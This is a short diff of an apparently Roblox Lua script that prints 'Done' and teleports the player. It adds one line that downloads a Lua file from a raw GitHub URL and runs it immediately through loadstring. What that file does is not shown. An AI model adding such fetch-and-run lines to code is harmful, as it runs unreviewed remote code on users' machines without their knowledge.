@@ -8,4 +8,5 @@ wait(7)
              end
 wait (.4)
 print("Done")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinaGoreng/siu/main/notif2.lua"))()
 game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
